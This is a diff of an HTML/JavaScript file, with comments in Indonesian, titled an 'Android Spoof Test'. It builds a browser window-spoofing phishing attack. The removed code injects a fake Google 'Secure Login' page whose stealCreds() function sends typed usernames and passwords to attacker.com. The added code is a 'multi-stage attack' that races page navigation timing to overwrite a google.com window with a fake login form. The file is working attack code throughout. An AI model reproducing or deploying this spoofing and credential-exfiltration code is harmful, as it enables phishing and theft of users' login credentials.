@@ -1,71 +1,29 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Android Spoof Test</title>
-</head>
-<body>
-    <button onclick="androidSpoof()">Click for Android Spoof</button>
-
-    <script>
-    function androidSpoof() {
-        // Buka new window/tab
-        let win = window.open('https://google.com', '_blank');
+<script>
+function hybridAndroidSpoof() {
+    // Multi-stage attack untuk Android
+    let win = window.open('about:blank', '_blank');
+    
+    // Stage 1: Set content dulu
+    win.document.write('<h1>Loading...</h1>');
+    
+    // Stage 2: Navigate setelah content set
+    setTimeout(() => {
+        win.location.href = 'https://google.com';
         
-        // Android butuh timing yang berbeda
-        let attempts = [10, 50, 100, 200, 500];
-        
-        attempts.forEach(delay => {
-            setTimeout(() => {
-                try {
-                    // Coba inject content sebelum navigation complete
-                    win.document.write(`
-                        <!DOCTYPE html>
-                        <html>
-                        <head>
-                            <title>Google</title>
-                            <style>
-                                body { 
-                                    font-family: Arial; 
-                                    padding: 20px;
-                                    background: #f1f1f1;
-                                }
-                                .google-style {
-                                    background: white;
-                                    padding: 40px;
-                                    border-radius: 8px;
-                                    text-align: center;
-                                }
-                            </style>
-                        </head>
-                        <body>
-                            <div class="google-style">
-                                <h1 style="color: #4285f4;">G</h1>
-                                <h3>Secure Login</h3>
-                                <p>Your session has expired. Please login again.</p>
-                                <input type="text" placeholder="Email or phone" id="user"><br><br>
-                                <input type="password" placeholder="Password" id="pass"><br><br>
-                                <button onclick="stealCreds()">Login</button>
-                            </div>
-                            <script>
-                                function stealCreds() {
-                                    let u = document.getElementById('user').value;
-                                    let p = document.getElementById('pass').value;
-                                    alert('Login successful!');
-                                    // Credentials bisa dikirim ke attacker server
-                                    fetch('https://attacker.com/steal?user=' + u + '&pass=' + p');
-                                }
-                            <\/script>
-                        </body>
-                        </html>
-                    `);
-                    win.document.close();
-                    console.log('SUCCESS at delay: ' + delay + 'ms');
-                } catch(e) {
-                    console.log('FAILED at delay: ' + delay + 'ms:', e.message);
-                }
-            }, delay);
-        });
-    }
-    </script>
-</body>
-</html>
+        // Stage 3: Coba intercept selama navigation
+        setTimeout(() => {
+            try {
+                win.document.write(`
+                    <h1>Fake Google Login</h1>
+                    <p>Please re-authenticate:</p>
+                    <input type="text" placeholder="username">
+                    <input type="password" placeholder="password">
+                    <button>Login</button>
+                `);
+            } catch(e) {
+                console.log('Intercept failed:', e);
+            }
+        }, 150);
+    }, 50);
+}
+</script>
